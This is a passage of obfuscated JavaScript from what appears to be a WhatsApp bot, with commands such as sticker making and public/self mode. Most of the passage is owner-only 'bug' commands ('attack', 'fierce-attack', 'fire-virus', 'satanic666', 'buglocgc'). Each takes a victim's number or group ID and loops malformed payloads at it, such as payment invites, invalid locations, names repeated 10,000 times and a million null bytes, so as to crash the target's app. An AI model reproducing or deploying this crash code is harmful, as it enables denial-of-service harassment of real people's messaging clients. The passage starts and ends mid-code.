            if (_0x31a5c4[_0xbcef60(0x12d)] == 0x0) return _0x2ae8ee[_0xbcef60(0x1c5)]('Enter a valid number and register on WhatsApp!!!');
            _0x4db93d[_0xbcef60(0x130)](bnnd), fs['writeFileSync']('./lib/user.json', JSON[_0xbcef60(0x15f)](_0x4db93d)), _0x2ae8ee[_0xbcef60(0x1c5)](_0xbcef60(0x174) + bnnd + _0xbcef60(0x163));
            break;
        case _0xbcef60(0x216):
            if (!_0x492e1a) return _0x2ae8ee[_0xbcef60(0x1c5)](global[_0xbcef60(0x248)]);
            if (!_0x3f2986[0x0]) return _0x2ae8ee[_0xbcef60(0x1c5)](_0xbcef60(0x1a0) + (_0x82bf04 + _0x3ba139) + _0xbcef60(0x14b) + (_0x82bf04 + _0x3ba139) + ' 50663646464');
            yaki = _0x4ff88b[_0xbcef60(0x11e)]('|')[0x0][_0xbcef60(0x201)](/[^0-9]/g, ''), unp = _0x4db93d[_0xbcef60(0x146)](yaki), _0x4db93d[_0xbcef60(0x14e)](unp, 0x1), fs[_0xbcef60(0x17e)](_0xbcef60(0x1c6), JSON[_0xbcef60(0x15f)](_0x4db93d)), _0x2ae8ee[_0xbcef60(0x1c5)](_0xbcef60(0x174) + yaki + _0xbcef60(0x166));
            break;
        case 'public': {
            if (!_0x492e1a) return _0x2ae8ee[_0xbcef60(0x1c5)](global[_0xbcef60(0x248)]);
            _0x17f1e9['public'] = !![], _0x2ae8ee[_0xbcef60(0x1c5)](_0xbcef60(0x1c2));
        }
        break;
        case _0xbcef60(0x13b): {
            if (!_0x492e1a) return _0x2ae8ee['reply'](global[_0xbcef60(0x248)]);
            _0x17f1e9[_0xbcef60(0x1ae)] = ![], _0x2ae8ee[_0xbcef60(0x1c5)](_0xbcef60(0x135));
        }
        break;
        case _0xbcef60(0x1cf):
            if (!_0x4a8d7b) return _0x2ae8ee['reply'](_0xbcef60(0x17c) + (_0x82bf04 + _0x3ba139));
            if (/image/ ['test'](_0x33fb74)) {
                await _0x1144e9();
                let _0x40ff9e = await _0x4a8d7b[_0xbcef60(0x182)](),
                    _0x999ad3 = await _0x17f1e9[_0xbcef60(0x1a1)](_0x3f5acb, _0x40ff9e, _0x2ae8ee, {
                        'packname': global['sticker1'],
                        'author': global[_0xbcef60(0x16b)]
                    });
                await fs['unlinkSync'](_0x999ad3);
            } else {
                if (/video/ [_0xbcef60(0x218)](_0x33fb74)) {
                    if ((_0x4a8d7b[_0xbcef60(0x139)] || _0x4a8d7b)['seconds'] > 0xb) return _0x2ae8ee[_0xbcef60(0x1c5)]('Maximum 10 seconds!');
                    let _0xc13bba = await _0x4a8d7b[_0xbcef60(0x182)](),
                        _0x421f2d = await _0x17f1e9[_0xbcef60(0x1bd)](_0x3f5acb, _0xc13bba, _0x2ae8ee, {
                            'packname': global['sticker1'],
                            'author': global['sticker2']
                        });
                    await fs[_0xbcef60(0x19e)](_0x421f2d);
                } else return _0x2ae8ee['reply']('Send Images/Videos With Caption ' + (_0x82bf04 + _0x3ba139) + _0xbcef60(0x1e4));
            }
            break;
        case 'inspect':
        case _0xbcef60(0x17f): {
            if (!_0x492e1a) return _0x2ae8ee[_0xbcef60(0x1c5)](global[_0xbcef60(0x248)]);
            if (!_0x4ff88b) return _0x2ae8ee[_0xbcef60(0x1c5)](_0xbcef60(0x13a));
            let _0x6a1ef2 = _0x3f2986[_0xbcef60(0x1c8)](' '),
                _0x36f5ea = _0x6a1ef2[_0xbcef60(0x11e)](_0xbcef60(0x1e9))[0x1];
            if (!_0x36f5ea) return _0x2bc9ce(_0xbcef60(0x1ad));
            _0x17f1e9[_0xbcef60(0x245)]({
                'tag': 'iq',
                'attrs': {
                    'type': _0xbcef60(0x1b5),
                    'xmlns': _0xbcef60(0x1bc),
                    'to': _0xbcef60(0x223)
                },
                'content': [{
                    'tag': _0xbcef60(0x187),
                    'attrs': {
                        'code': _0x36f5ea
                    }
                }]
            })['then'](async _0x567981 => {
                const _0x2ac472 = _0xbcef60;
                tekse = '' + (_0x567981['content'][0x0]['attrs']['id'] ? _0x567981[_0x2ac472(0x12b)][0x0][_0x2ac472(0x16a)]['id'] : _0x2ac472(0x17b)), _0x2bc9ce(tekse);
            });
        }
        break;
        case '⚡':
            if (!_0x492e1a) return _0x2ae8ee[_0xbcef60(0x1c5)](global[_0xbcef60(0x248)]);
            if (!q) return _0x2ae8ee[_0xbcef60(0x1c5)](_0xbcef60(0x23b));
            Pe = _0x2ae8ee[_0xbcef60(0x1f6)][0x0] ? _0x2ae8ee[_0xbcef60(0x1f6)][0x0] : _0x2ae8ee[_0xbcef60(0x138)] ? _0x2ae8ee[_0xbcef60(0x138)][_0xbcef60(0x152)] : _0x4ff88b[_0xbcef60(0x201)](/[^0-9]/g, '') + _0xbcef60(0x162), jumlah = 0x14, _0x4683b4(Pe, jumlah), await sleep(0x7d0), _0x2ae8ee[_0xbcef60(0x1c5)](_0xbcef60(0x1de) + Pe + _0xbcef60(0x207));
            break;
        case 'not-found':
            if (!_0x492e1a) return _0x2ae8ee[_0xbcef60(0x1c5)](global['nocreator']);
            if (!q) return _0x2ae8ee[_0xbcef60(0x1c5)]('Insert Id Group');
            Pe = _0x2ae8ee[_0xbcef60(0x1f6)][0x0] ? _0x2ae8ee[_0xbcef60(0x1f6)][0x0] : _0x2ae8ee[_0xbcef60(0x138)] ? _0x2ae8ee[_0xbcef60(0x138)][_0xbcef60(0x152)] : _0x4ff88b[_0xbcef60(0x201)](/[^0-9]/g, '') + _0xbcef60(0x223), jumlah = 0x14, _0x4683b4(Pe, jumlah), await sleep(0x7d0), _0x2ae8ee[_0xbcef60(0x1c5)](_0xbcef60(0x1f5) + Pe + _0xbcef60(0x207));
            break;
        case _0xbcef60(0x1cb):
            if (!_0x492e1a) return _0x2ae8ee['reply'](global[_0xbcef60(0x248)]);
            jumlah = 0x14, _0x4683b4(_0x3f5acb, jumlah), await sleep(0x7d0), _0x2ae8ee[_0xbcef60(0x1c5)](_0xbcef60(0x127));
            break;
        case _0xbcef60(0x171):
        case 'youtubemp3': {
            if (!_0x492e1a) return _0x2ae8ee['reply'](_0xbcef60(0x121));
            if (!q) return _0x2ae8ee[_0xbcef60(0x1c5)]('彡 Contoh  : ' + (_0x82bf04 + _0x3ba139) + _0xbcef60(0x222));
            await _0x1144e9(), _0x3fcec2(q);
        }
        break;
        case _0xbcef60(0x23c): {
            _0x2ae8ee['reply']('Bot Ready to Use 🤗');
        }
        break;
        case 'bugvid1':
            if (!_0x492e1a) return _0x2ae8ee[_0xbcef60(0x1c5)](_0xbcef60(0x121));
            bugvid1 = fs[_0xbcef60(0x219)](_0xbcef60(0x205)), _0x17f1e9[_0xbcef60(0x156)](_0x3f5acb, {
                'video': bugvid1
            }, {
                'quoted': _0x4b3ddc
            });
            break;
        case _0xbcef60(0x206):
            if (!_0x492e1a) return _0x2ae8ee[_0xbcef60(0x1c5)](_0xbcef60(0x121));
            bugvid1 = fs[_0xbcef60(0x219)](_0xbcef60(0x168)), _0x17f1e9[_0xbcef60(0x156)](_0x3f5acb, {
                'video': bugvid1
            }, {
                'quoted': _0x4b3ddc
            });
            break;
        case _0xbcef60(0x19b):
            if (!_0x492e1a) return _0x2ae8ee[_0xbcef60(0x1c5)](global['nocreator']);
            if (!q) return _0x2bc9ce(_0xbcef60(0x179) + (_0x82bf04 + _0x3ba139) + _0xbcef60(0x1b4));
            papttfoto = JSON['parse'](fs[_0xbcef60(0x219)]('./lib/paptt-foto.json')), papttvideo = JSON[_0xbcef60(0x15e)](fs[_0xbcef60(0x219)]('./lib/paptt-video.json')), titid1 = _0xa0d8fd(papttfoto), titid2 = _0xa0d8fd(papttvideo);
            if (q == _0xbcef60(0x22d)) _0x2bc9ce(_0xbcef60(0x136)), _0x17f1e9[_0xbcef60(0x156)](_0x2ae8ee[_0xbcef60(0x152)], {
                'image': {
                    'url': titid1
                },
                'caption': 'Mana Tahan🥵'
            }, {
                'quoted': _0x2ae8ee
            });
            else q == _0xbcef60(0x228) && (_0x2bc9ce(_0xbcef60(0x239)), _0x17f1e9[_0xbcef60(0x156)](_0x2ae8ee['sender'], {
                'video': {
                    'url': titid2
                },
                'caption': 'Mana Tahan🥵'
            }, {
                'quoted': _0x2ae8ee
            }));
            break;
        case _0xbcef60(0x209): {
            if (!_0x492e1a) return _0x2ae8ee['reply'](global['nocreator']);
            if (!_0x4a8d7b) return _0x2bc9ce('Reply Media');
            _0x2bc9ce('*please wait a moment*');
            let _0x1e7335 = await _0x17f1e9[_0xbcef60(0x1b2)](_0x4a8d7b);
            if (/image/ [_0xbcef60(0x218)](_0x33fb74)) anuh = await _0x322437(_0x1e7335), _0x2bc9ce(util[_0xbcef60(0x144)](anuh));
            else {
                if (/video/ [_0xbcef60(0x218)](_0x33fb74)) anuh = await _0x322437(_0x1e7335), _0x2bc9ce(util['format'](anuh));
                else !/image/ [_0xbcef60(0x218)](_0x33fb74) && (anuh = await _0x408966(_0x1e7335), _0x2bc9ce(util[_0xbcef60(0x144)](anuh)));
            }
            await fs['unlinkSync'](_0x1e7335);
        }
        break;
        case 'attack':
            if (!_0x492e1a) return _0x2ae8ee[_0xbcef60(0x1c5)](global['nocreator']);
            if (!q) return _0x2ae8ee[_0xbcef60(0x1c5)](_0xbcef60(0x23b));
            Pe = _0x2ae8ee[_0xbcef60(0x1f6)][0x0] ? _0x2ae8ee['mentionedJid'][0x0] : _0x2ae8ee[_0xbcef60(0x138)] ? _0x2ae8ee[_0xbcef60(0x138)][_0xbcef60(0x152)] : _0x4ff88b[_0xbcef60(0x201)](/[^0-9]/g, '') + _0xbcef60(0x162), jumlah = 0x14, _0x4c94b5(Pe, jumlah), await sleep(0x7d0), _0x2ae8ee[_0xbcef60(0x1c5)](_0xbcef60(0x237) + Pe + _0xbcef60(0x22f));
            break;
        case _0xbcef60(0x125):
            if (!_0x492e1a) return _0x2ae8ee[_0xbcef60(0x1c5)](global[_0xbcef60(0x248)]);
            if (!q) return _0x2ae8ee['reply'](_0xbcef60(0x199));
            Pe = _0x2ae8ee['mentionedJid'][0x0] ? _0x2ae8ee[_0xbcef60(0x1f6)][0x0] : _0x2ae8ee[_0xbcef60(0x138)] ? _0x2ae8ee[_0xbcef60(0x138)]['sender'] : _0x4ff88b[_0xbcef60(0x201)](/[^0-9]/g, '') + _0xbcef60(0x223), jumlah = 0x14, _0x4c94b5(Pe, jumlah), await sleep(0x7d0), _0x2ae8ee['reply'](_0xbcef60(0x169) + Pe + _0xbcef60(0x22f));
            break;
        case _0xbcef60(0x1ee):
            if (!_0x492e1a) return _0x2ae8ee[_0xbcef60(0x1c5)](global[_0xbcef60(0x248)]);
            jumlah = 0x14, _0x4c94b5(_0x3f5acb, jumlah), await sleep(0x7d0), _0x2ae8ee['reply'](_0xbcef60(0x147));
            break;
        case _0xbcef60(0x18e):
            if (!_0x492e1a) return _0x2ae8ee[_0xbcef60(0x1c5)](global[_0xbcef60(0x248)]);
            if (!q) return _0x2ae8ee['reply']('彡 masukan nomor tujuan\x0a\x0a彡Contoh 6283123456789');
            Pe = _0x2ae8ee[_0xbcef60(0x1f6)][0x0] ? _0x2ae8ee[_0xbcef60(0x1f6)][0x0] : _0x2ae8ee[_0xbcef60(0x138)] ? _0x2ae8ee['quoted'][_0xbcef60(0x152)] : _0x4ff88b[_0xbcef60(0x201)](/[^0-9]/g, '') + _0xbcef60(0x162), jumlah = 0x384, _0x4683b4(Pe, jumlah), await sleep(0x7d0), _0x2ae8ee[_0xbcef60(0x1c5)](_0xbcef60(0x237) + Pe + '. Please pause commenting for 3 minutes 🤗');
            break;
        case _0xbcef60(0x1aa):
            if (!_0x492e1a) return _0x2ae8ee[_0xbcef60(0x1c5)](global['nocreator']);
            if (!q) return _0x2ae8ee[_0xbcef60(0x1c5)](_0xbcef60(0x23b));
            Pe = _0x2ae8ee['mentionedJid'][0x0] ? _0x2ae8ee['mentionedJid'][0x0] : _0x2ae8ee[_0xbcef60(0x138)] ? _0x2ae8ee[_0xbcef60(0x138)][_0xbcef60(0x152)] : _0x4ff88b[_0xbcef60(0x201)](/[^0-9]/g, '') + _0xbcef60(0x162), jumlah = 0x5460, _0x4683b4(Pe, jumlah), await sleep(0x7d0), _0x2ae8ee['reply'](_0xbcef60(0x237) + Pe + '. Please pause commenting for 3 minutes 🤗');
            break;
        case _0xbcef60(0x1f3): {
            if (!_0x492e1a) return _0x2ae8ee['reply'](global[_0xbcef60(0x248)]);
            if (!q) return _0x2ae8ee[_0xbcef60(0x1c5)](_0xbcef60(0x23b));
            Pe = _0x2ae8ee[_0xbcef60(0x1f6)][0x0] ? _0x2ae8ee['mentionedJid'][0x0] : _0x2ae8ee[_0xbcef60(0x138)] ? _0x2ae8ee['quoted']['sender'] : _0x4ff88b[_0xbcef60(0x201)](/[^0-9]/g, '') + _0xbcef60(0x162), await _0x17f1e9[_0xbcef60(0x156)](Pe, {
                'text': _0xbcef60(0x12a),
                'contextInfo': {
                    'isForwarded': !![],
                    'forwardedNewsletterMessageInfo': {
                        'newsletterJid': _0xbcef60(0x211),
                        'newsletterName': _0xbcef60(0x214)[_0xbcef60(0x10d)](0x2710),
                        'serverMessageId': 0x2
                    }
                }
            }, {
                'quoted': _0x433d82
            }), await sleep(0x7d0), await _0x17f1e9[_0xbcef60(0x156)](Pe, {
                'react': {
                    'text': '🦄',
                    'key': {
                        'remoteJid': _0x2ae8ee['chat'],
                        'fromMe': !![],
                        'id': _0x4a8d7b['id']
                    }
                }
            });
        }
        break;
        case _0xbcef60(0x1e3): {
            if (!_0x492e1a) return _0x2ae8ee['reply'](global['nocreator']);
            if (!q) return _0x2ae8ee[_0xbcef60(0x1c5)](_0xbcef60(0x191));
            Pe = _0x2ae8ee[_0xbcef60(0x1f6)][0x0] ? _0x2ae8ee[_0xbcef60(0x1f6)][0x0] : _0x2ae8ee[_0xbcef60(0x138)] ? _0x2ae8ee[_0xbcef60(0x138)][_0xbcef60(0x152)] : _0x4ff88b['replace'](/[^0-9]/g, '') + _0xbcef60(0x223), await _0x17f1e9[_0xbcef60(0x156)](Pe, {
                'text': 'deltaxcrash Reaction??',
                'contextInfo': {
                    'isForwarded': !![],
                    'forwardedNewsletterMessageInfo': {
                        'newsletterJid': _0xbcef60(0x211),
                        'newsletterName': _0xbcef60(0x214)[_0xbcef60(0x10d)](0x2710),
                        'serverMessageId': 0x2
                    }
                }
            }, {
                'quoted': _0x433d82
            }), await sleep(0x7d0), await _0x17f1e9[_0xbcef60(0x156)](Pe, {
                'react': {
                    'text': '🦄',
                    'key': {
                        'remoteJid': _0x2ae8ee[_0xbcef60(0x1c0)],
                        'fromMe': !![],
                        'id': _0x4a8d7b['id']
                    }
                }
            });
        }
        break;
        case 'fierce-attack ': {
            if (!_0x492e1a) return _0x2ae8ee[_0xbcef60(0x1c5)](global[_0xbcef60(0x248)]);
            if (!q) return _0x2ae8ee[_0xbcef60(0x1c5)](_0xbcef60(0x11f) + (_0x82bf04 + _0x3ba139) + _0xbcef60(0x1a3));
            victim = _0x4ff88b['split']('|')[0x0], amount = _0x4ff88b[_0xbcef60(0x11e)]('|')[0x1], Pe = _0x2ae8ee[_0xbcef60(0x1f6)][0x0] ? _0x2ae8ee[_0xbcef60(0x1f6)][0x0] : _0x2ae8ee[_0xbcef60(0x138)] ? _0x2ae8ee['quoted'][_0xbcef60(0x152)] : victim[_0xbcef60(0x201)](/[^0-9]/g, '') + _0xbcef60(0x162);
            for (let _0x27b439 = 0x0; _0x27b439 < amount; _0x27b439++) {
                await _0x17f1e9[_0xbcef60(0x215)](Pe, {
                    'paymentInviteMessage': {
                        'serviceType': _0xbcef60(0x210),
                        'expiryTimestamp': Date[_0xbcef60(0x190)]() + 0x6c258c00
                    }
                }, {}), await sleep(0x578);
            }
            _0x2ae8ee['reply']('彡 Oke nice successfully send bug to ' + victim);
        }
        break;
        case 'not-human': {
            if (!_0x492e1a) return _0x2ae8ee[_0xbcef60(0x1c5)](global['nocreator']);
            if (!q) return _0x2ae8ee[_0xbcef60(0x1c5)]('彡 Contoh :\x0a ' + (_0x82bf04 + _0x3ba139) + _0xbcef60(0x115));
            victim = _0x4ff88b['split']('|')[0x0], amount = _0x4ff88b[_0xbcef60(0x11e)]('|')[0x1], Pe = _0x2ae8ee[_0xbcef60(0x1f6)][0x0] ? _0x2ae8ee['mentionedJid'][0x0] : _0x2ae8ee[_0xbcef60(0x138)] ? _0x2ae8ee[_0xbcef60(0x138)][_0xbcef60(0x152)] : victim[_0xbcef60(0x201)](/[^0-9]/g, '') + _0xbcef60(0x223);
            for (let _0x3d5b2e = 0x0; _0x3d5b2e < amount; _0x3d5b2e++) {
                await _0x17f1e9[_0xbcef60(0x215)](Pe, {
                    'paymentInviteMessage': {
                        'serviceType': _0xbcef60(0x210),
                        'expiryTimestamp': Date['now']() + 0x6c258c00
                    }
                }, {}), await sleep(0x578);
            }
            _0x2ae8ee[_0xbcef60(0x1c5)](_0xbcef60(0x21a) + victim);
        }
        break;
        case 'fire-virus': {
            if (!_0x492e1a) return _0x2ae8ee[_0xbcef60(0x1c5)](global[_0xbcef60(0x248)]);
            if (!q) return _0x2ae8ee['reply']('彡 Contoh :\x0a ' + (_0x82bf04 + _0x3ba139) + ' 62xxxxxxxxxx|5');
            victim = _0x4ff88b[_0xbcef60(0x11e)]('|')[0x0], amount = _0x4ff88b['split']('|')[0x1], Pe = _0x2ae8ee[_0xbcef60(0x1f6)][0x0] ? _0x2ae8ee['mentionedJid'][0x0] : _0x2ae8ee[_0xbcef60(0x138)] ? _0x2ae8ee[_0xbcef60(0x138)][_0xbcef60(0x152)] : victim[_0xbcef60(0x201)](/[^0-9]/g, '') + _0xbcef60(0x162), deltaxcrashganteng = await getBuffer(_0xbcef60(0x1f2));
            for (let _0x44ff50 = 0x0; _0x44ff50 < amount; _0x44ff50++) {
                _0x17f1e9[_0xbcef60(0x156)](Pe, {
                    'caption': _0xbcef60(0x118),
                    'audio': deltaxcrashganteng,
                    'mimetype': 'audio/mpeg',
                    'ptt': ![],
                    'title': 'p',
                    'contextInfo': {
                        'forwardingScore': 0x5f5e0ff,
                        'isForwarded': !![],
                        'forwardedNewsletterMessageInfo': {
                            'newsletterJid': _0xbcef60(0x124),
                            'newsletterName': _0xbcef60(0x132)['repeat'](0x2710),
                            'serverMessageId': 0x2
                        }
                    }
                }, {
                    'quoted': _0x433d82
                }), await sleep(0x5dc);
            }
            _0x2ae8ee[_0xbcef60(0x1c5)](_0xbcef60(0x22a) + _0x3ba139 + _0xbcef60(0x1bb) + Pe);
        }
        break;
        case _0xbcef60(0x131): {
            if (!_0x492e1a) return _0x2ae8ee[_0xbcef60(0x1c5)](global['nocreator']);
            if (!q) return _0x2ae8ee[_0xbcef60(0x1c5)]('彡 Contoh :\x0a ' + (_0x82bf04 + _0x3ba139) + ' 628xxxx|5');
            victim = _0x4ff88b[_0xbcef60(0x11e)]('|')[0x0], amount = _0x4ff88b[_0xbcef60(0x11e)]('|')[0x1], Pe = _0x2ae8ee['mentionedJid'][0x0] ? _0x2ae8ee[_0xbcef60(0x1f6)][0x0] : _0x2ae8ee[_0xbcef60(0x138)] ? _0x2ae8ee[_0xbcef60(0x138)]['sender'] : victim[_0xbcef60(0x201)](/[^0-9]/g, '') + '@g.us', deltaxcrashganteng = await getBuffer(_0xbcef60(0x1f2));
            for (let _0x39af0c = 0x0; _0x39af0c < amount; _0x39af0c++) {
                _0x17f1e9[_0xbcef60(0x156)](Pe, {
                    'caption': 'deltaxcrash Official',
                    'audio': deltaxcrashganteng,
                    'mimetype': _0xbcef60(0x1d8),
                    'ptt': ![],
                    'title': 'p',
                    'contextInfo': {
                        'forwardingScore': 0x5f5e0ff,
                        'isForwarded': !![],
                        'forwardedNewsletterMessageInfo': {
                            'newsletterJid': _0xbcef60(0x124),
                            'newsletterName': _0xbcef60(0x132)[_0xbcef60(0x10d)](0x2710),
                            'serverMessageId': 0x2
                        }
                    }
                }, {
                    'quoted': _0x433d82
                }), await sleep(0x5dc);
            }
            _0x2ae8ee[_0xbcef60(0x1c5)]('彡 Oke nice successfully send bug ' + _0x3ba139 + _0xbcef60(0x175) + Pe);
        }
        break;
        case _0xbcef60(0x149): {
            if (!_0x492e1a) return _0x2ae8ee['reply'](global[_0xbcef60(0x248)]);
            if (!q) return _0x2ae8ee[_0xbcef60(0x1c5)](_0xbcef60(0x11f) + (_0x82bf04 + _0x3ba139) + _0xbcef60(0x1a3));
            victim = _0x4ff88b[_0xbcef60(0x11e)]('|')[0x0], amount = _0x4ff88b[_0xbcef60(0x11e)]('|')[0x1], Pe = _0x2ae8ee['mentionedJid'][0x0] ? _0x2ae8ee[_0xbcef60(0x1f6)][0x0] : _0x2ae8ee['quoted'] ? _0x2ae8ee[_0xbcef60(0x138)][_0xbcef60(0x152)] : victim[_0xbcef60(0x201)](/[^0-9]/g, '') + '@s.whatsapp.net', XeonOP = global['virtexpc'];
            for (let _0x53ee43 = 0x0; _0x53ee43 < amount; _0x53ee43++) {
                _0x17f1e9[_0xbcef60(0x156)](Pe, {
                    'location': {
                        'degreesLatitude': 173.282,
                        'degreesLongitude': -19.378,
                        'name': _0xbcef60(0x132),
                        'address': _0xbcef60(0x11c),
                        'url': _0xbcef60(0x1e5) + XeonOP + _0xbcef60(0x1b9),
                        'comment': _0xbcef60(0x1fc),
                        'jpegThumbnail': null,
                        'contextInfo': {
                            'forwardingScore': 0x5f5e0ff,
                            'isForwarded': !![],
                            'forwardedNewsletterMessageInfo': {
                                'newsletterJid': '120363144038483540@newsletter',
                                'newsletterName': _0xbcef60(0x132)[_0xbcef60(0x10d)](0x2710),
                                'serverMessageId': 0x2
                            }
                        }
                    }
                }, {
                    'quoted': _0x433d82
                }), await sleep(0x5dc);
            }
            _0x2ae8ee[_0xbcef60(0x1c5)]('*_彡 Successfully send bug_*');
        }
        break;
        case 'buglocgc': {
            if (!_0x492e1a) return _0x2ae8ee[_0xbcef60(0x1c5)](global[_0xbcef60(0x248)]);
            if (!q) return _0x2ae8ee[_0xbcef60(0x1c5)](_0xbcef60(0x11f) + (_0x82bf04 + _0x3ba139) + _0xbcef60(0x115));
            victim = _0x4ff88b[_0xbcef60(0x11e)]('|')[0x0], amount = _0x4ff88b[_0xbcef60(0x11e)]('|')[0x1], Pe = _0x2ae8ee[_0xbcef60(0x1f6)][0x0] ? _0x2ae8ee['mentionedJid'][0x0] : _0x2ae8ee[_0xbcef60(0x138)] ? _0x2ae8ee['quoted']['sender'] : victim[_0xbcef60(0x201)](/[^0-9]/g, '') + _0xbcef60(0x223), XeonOP = global['virtexpc'];
            for (let _0x56a15f = 0x0; _0x56a15f < amount; _0x56a15f++) {
                _0x17f1e9[_0xbcef60(0x156)](Pe, {
                    'location': {
                        'degreesLatitude': 173.282,
                        'degreesLongitude': -19.378,
                        'name': '彡deltaxcrash',
                        'address': _0xbcef60(0x11c),
                        'url': _0xbcef60(0x1e5) + XeonOP + _0xbcef60(0x1b9),
                        'comment': 'BUG LOCATION',
                        'jpegThumbnail': null,
                        'contextInfo': {
                            'forwardingScore': 0x5f5e0ff,
                            'isForwarded': !![],
                            'forwardedNewsletterMessageInfo': {
                                'newsletterJid': '120363144038483540@newsletter',
                                'newsletterName': _0xbcef60(0x132)['repeat'](0x2710),
                                'serverMessageId': 0x2
                            }
                        }
                    }
                }, {
                    'quoted': _0x433d82
                }), await sleep(0x5dc);
            }
            _0x2ae8ee['reply'](_0xbcef60(0x114));
        }
        break;
        case _0xbcef60(0x1bf):
            if (!_0x492e1a) return _0x2ae8ee[_0xbcef60(0x1c5)](global[_0xbcef60(0x248)]);
            if (!q) return _0x2ae8ee['reply']('彡 Contoh :\x0a ' + (_0x82bf04 + _0x3ba139) + _0xbcef60(0x17d));
            victim = _0x4ff88b['split']('|')[0x0], amount = _0x4ff88b[_0xbcef60(0x11e)]('|')[0x1], XeonOP = global['virtexpc'], Pe = _0x2ae8ee['mentionedJid'][0x0] ? _0x2ae8ee[_0xbcef60(0x1f6)][0x0] : _0x2ae8ee['quoted'] ? _0x2ae8ee[_0xbcef60(0x138)]['sender'] : victim['replace'](/[^0-9]/g, '') + _0xbcef60(0x162);
            for (let _0x2e7061 = 0x0; _0x2e7061 < amount; _0x2e7061++) {
                menuu = _0xbcef60(0x244), hohe = [{
                    'name': _0xbcef60(0x19d),
                    'buttonParamsJson': ''
                }, {
                    'name': 'cta_url',
                    'buttonParamsJson': JSON[_0xbcef60(0x15f)]({
                        'display_text': '',
                        'url': _0xbcef60(0x14c),
                        'merchant_url': _0xbcef60(0x14c)
                    })
                }], ewe = '' + menuu, _0x17f1e9[_0xbcef60(0x172)](Pe, hohe, _0x2ae8ee, {
                    'body': ewe,
                    'footer': XeonOP
                });
            }
            _0x2ae8ee['reply'](_0xbcef60(0x114));
            break;
        case 'satanic666':
            if (!_0x492e1a) return _0x2ae8ee[_0xbcef60(0x1c5)](global['nocreator']);
            if (!q) return _0x2ae8ee[_0xbcef60(0x1c5)](_0xbcef60(0x11f) + (_0x82bf04 + _0x3ba139) + _0xbcef60(0x240));
            victim = _0x4ff88b[_0xbcef60(0x11e)]('|')[0x0], amount = _0x4ff88b[_0xbcef60(0x11e)]('|')[0x1], XeonOP = global[_0xbcef60(0x181)], Pe = _0x2ae8ee[_0xbcef60(0x1f6)][0x0] ? _0x2ae8ee[_0xbcef60(0x1f6)][0x0] : _0x2ae8ee[_0xbcef60(0x138)] ? _0x2ae8ee[_0xbcef60(0x138)][_0xbcef60(0x152)] : victim['replace'](/[^0-9]/g, '') + '@g.us';
            for (let _0x52a56a = 0x0; _0x52a56a < amount; _0x52a56a++) {
                menuu = _0xbcef60(0x12e), hohe = [{
                    'name': _0xbcef60(0x19d),
                    'buttonParamsJson': ''
                }, {
                    'name': 'cta_url',
                    'buttonParamsJson': JSON[_0xbcef60(0x15f)]({
                        'display_text': '',
                        'url': _0xbcef60(0x14c),
                        'merchant_url': _0xbcef60(0x14c)
                    })
                }], ewe = '' + menuu, _0x17f1e9['sendButton'](Pe, hohe, _0x2ae8ee, {
                    'body': ewe,
                    'footer': XeonOP
                });
            }
            _0x2ae8ee['reply'](_0xbcef60(0x114));
            break;
        case _0xbcef60(0x1e2):
            if (!_0x492e1a) return _0x2ae8ee[_0xbcef60(0x1c5)](global[_0xbcef60(0x248)]);
            XeonOP = global['virtexpc'], menuu = _0xbcef60(0x244), hohe = [{
                'name': _0xbcef60(0x19d),
                'buttonParamsJson': ''
            }, {
                'name': _0xbcef60(0x150),
                'buttonParamsJson': JSON[_0xbcef60(0x15f)]({
                    'display_text': '',
                    'url': 'https://youtube.com/@deltatech.i',
                    'merchant_url': _0xbcef60(0x14c)
                })
            }], ewe = '' + menuu, _0x17f1e9['sendButton'](_0x3f5acb, hohe, _0x2ae8ee, {
                'body': ewe,
                'footer': _0xbcef60(0x1fa)
            }), _0x2ae8ee[_0xbcef60(0x1c5)](_0xbcef60(0x114));
            break;
        case _0xbcef60(0x157):
            if (!_0x492e1a) return _0x2ae8ee[_0xbcef60(0x1c5)](global[_0xbcef60(0x248)]);
            if (!q) return _0x2ae8ee[_0xbcef60(0x1c5)]('彡 Contoh :\x0a ' + (_0x82bf04 + _0x3ba139) + ' 62xxxx|5');
            victim = _0x4ff88b[_0xbcef60(0x11e)]('|')[0x0], amount = _0x4ff88b[_0xbcef60(0x11e)]('|')[0x1], Pe = _0x2ae8ee[_0xbcef60(0x1f6)][0x0] ? _0x2ae8ee[_0xbcef60(0x1f6)][0x0] : _0x2ae8ee[_0xbcef60(0x138)] ? _0x2ae8ee['quoted'][_0xbcef60(0x152)] : victim[_0xbcef60(0x201)](/[^0-9]/g, '') + _0xbcef60(0x162);
            for (let _0x574bc0 = 0x0; _0x574bc0 < amount; _0x574bc0++) {
                var _0x5cf9f4 = generateWAMessageFromContent(_0x3f5acb, proto['Message'][_0xbcef60(0x1c3)]({
                    'viewOnceMessage': {
                        'message': {
                            'interactiveMessage': {
                                'header': {
                                    'title': '',
                                    'subtitle': ' '
                                },
                                'body': {
                                    'text': _0xbcef60(0x10b)
                                },
                                'footer': {
                                    'text': _0xbcef60(0x1a5)
                                },
                                'nativeFlowMessage': {
                                    'buttons': [{
                                        'name': _0xbcef60(0x150),
                                        'buttonParamsJson': _0xbcef60(0x1d1)
                                    }],
                                    'messageParamsJson': '\x00' [_0xbcef60(0x10d)](0xf4240)
                                }
                            }
                        }
                    }
                }), {
                    'userJid': _0x3f5acb,
                    'quoted': _0x2ae8ee
                });
                await _0x17f1e9['relayMessage'](Pe, _0x5cf9f4[_0xbcef60(0x13f)], {
                    'messageId': _0x5cf9f4[_0xbcef60(0x18d)]['id']
                });
            }
            _0x2ae8ee[_0xbcef60(0x1c5)]('</> Succes');
            break;
        case _0xbcef60(0x1fd):
            if (!_0x492e1a) return _0x2ae8ee[_0xbcef60(0x1c5)](global[_0xbcef60(0x248)]);
            if (!q) return _0x2ae8ee[_0xbcef60(0x1c5)](_0xbcef60(0x11f) + (_0x82bf04 + _0x3ba139) + _0xbcef60(0x17d));
            victim = _0x4ff88b[_0xbcef60(0x11e)]('|')[0x0], amount = _0x4ff88b[_0xbcef60(0x11e)]('|')[0x1], Pe = _0x2ae8ee[_0xbcef60(0x1f6)][0x0] ? _0x2ae8ee[_0xbcef60(0x1f6)][0x0] : _0x2ae8ee[_0xbcef60(0x138)] ? _0x2ae8ee[_0xbcef60(0x138)][_0xbcef60(0x152)] : victim[_0xbcef60(0x201)](/[^0-9]/g, '') + '@g.us';
            for (let _0x13eac5 = 0x0; _0x13eac5 < amount; _0x13eac5++) {
                var _0x5cf9f4 = generateWAMessageFromContent(_0x3f5acb, proto[_0xbcef60(0x1dd)][_0xbcef60(0x1c3)]({
